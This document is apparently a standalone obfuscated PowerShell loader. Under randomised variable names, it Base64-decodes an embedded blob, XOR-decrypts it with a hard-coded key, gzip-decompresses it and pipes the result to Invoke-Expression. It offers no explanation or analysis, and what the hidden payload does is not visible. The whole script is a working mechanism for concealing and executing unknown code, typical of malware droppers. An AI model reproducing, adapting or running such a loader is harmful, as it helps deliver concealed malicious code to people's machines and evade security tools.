$dsk58he30fl4zmy = [System.Text.Encoding]::ascii
function oixpydlaw13h20tqn4f7r98ezkb  {param($e9yvinh6oj0xsbm )
  $a7u86q1gelb9xpr = [System.Convert]::FromBase64String($e9yvinh6oj0xsbm)
  $d5zn347s80ixj2o= $dsk58he30fl4zmy.GetBytes("1tdp9zv8kc7s")
    $n7h5pul80xebmsq = $a7u86q1gelb9xpr
    $ws9u5m3x6id0e72 = $(for ($gf1bnyztjw0lkr9 = 0; $gf1bnyztjw0lkr9 -lt $n7h5pul80xebmsq.length; ) {
        for ($8ikouj6ne709w31 = 0; $8ikouj6ne709w31 -lt $d5zn347s80ixj2o.length; $8ikouj6ne709w31++) {
            $n7h5pul80xebmsq[$gf1bnyztjw0lkr9] -bxor $d5zn347s80ixj2o[$8ikouj6ne709w31]
            $gf1bnyztjw0lkr9++
            if ($gf1bnyztjw0lkr9 -ge $n7h5pul80xebmsq.Length) {
                $8ikouj6ne709w31 = $d5zn347s80ixj2o.length
            }
        }
    })
	$xnmf9rglu0e534j = New-Object System.IO.MemoryStream( , $ws9u5m3x6id0e72 )

	    $0igrz98xubpt5yk = New-Object System.IO.MemoryStream
        $cx0p1no782k5vta = New-Object System.IO.Compression.GzipStream $xnmf9rglu0e534j, ([IO.Compression.CompressionMode]::Decompress)
	    $cx0p1no782k5vta.CopyTo( $0igrz98xubpt5yk )
        $cx0p1no782k5vta.Close()
		$xnmf9rglu0e534j.Close()
		[byte[]] $fpbuy8dwa6gel41 = $0igrz98xubpt5yk.ToArray()
 $l23y40zik56mp8s=$fpbuy8dwa6gel41
    return $l23y40zik56mp8s
}
[byte[]]$hypqzg07rmbfu9e=oixpydlaw13h20tqn4f7r98ezkb $uv3qybd4g2zciox
[System.Text.Encoding]::ascii.GetString((oixpydlaw13h20tqn4f7r98ezkb "Lv9scDl6djhvY7omXBvHSCmECnCXZPyRZQY9YFDJO+vBfKVfXMezhMNoq9Y21W1KUbRtaFM2KOKgHIiSFBkuhno7dAR1XMS/AhfHWhOmKP52qlX9Y+MdI6/Db3pEybWTe/xE4ZfrOE4Zn+OBWEyJ3iuLf1F69nafBz5LXRwEYMBv/pS68k7xRAu9Ah0m+AzC+sybCEMwJL9akKW5zy62JP5bBQVU+0X5Kk3hbLwDPpcb8nbsIRKN+YJ0YIA68h4x5NwYVN35Yli61EnwqVvM4NkLV9rDLGUJ7do4mtH3XPmm9ZS1CrWDVDI12i32Jd6g9ke685d67/CX44NyeafZKLl+yO/xkcLArVnJABfARlv2wgrYIL5ZRl8yzxfoUOMzCubx2B4WaF/YAHlIZwMdpJMqne5p1p2VGi652+AG8cdAPhEGj/us6Jf6vi4XMTAOnXWypg7hmd/gBe6g9dOf6mVtL9RaTbWfuiYvjsTgu+Pbmetn7I8OrpCcMYMZ2JOZtqnD0Atpii0/NgGZyolelJBeF5BBTNK33ymm2LNcfk/WECpqguwV1NKsnPBZLk8FKtztBF3XrJUXn47ELGtzkzf2iXsrt490tUwmthm0znzGIDOF7qWvtDDyDuwVDS3bYTWXYht5ArZeqSDUFT04UvD1RAY99l+dA9wbkc0hl9fv70W6eDCrf6876vLohbY6ZoAkJT33lD1eex/7O8zVTYOHh7/yx5oRWLxAtBDKwCnxu0sVOLrD5ztsbAFJsbUGw4CIKyRrO4XHKJwFAbMV1QYqCbh3gmfjcXJ9x0B0Tjfr8sZEOEfe97j2GwU63YAAnH+hbY4weYbiiC2QRHbaVHQTQjW8a2BuAIhv/plSZwwmwr+VNH8NKvWaRW3yt1GMVP1jfulCgHJhgf8CzfFtmvEi2s35hRAnGPV/cLkM0xN2aVRdQhFIBQZAuo2tg8QlNigSfMzb9+cVZc+YUbwjXfJgq+E0Tcyeuv+6oIMkTK88nQisNgPSAwLh+ULVFlqs7i2ni82B44eXsKmqBgK7aszsOMPNXIu3XpPd2h2L5LJfw1b7CSl+M5kPXdpvLdKGh3Z8lwWa87RwA7HDjD78cJt0y7qp3SF01qPSY09Ivxc+esU2DdOix7H33CcgTVlVmFwkPSH9Jhif7sbQ8uuksTin3bBoIr73M4Lg73x6DfXL/Elmm6gUtd8ek7ZXSHqMMkwXnQYlcThr"))|iex;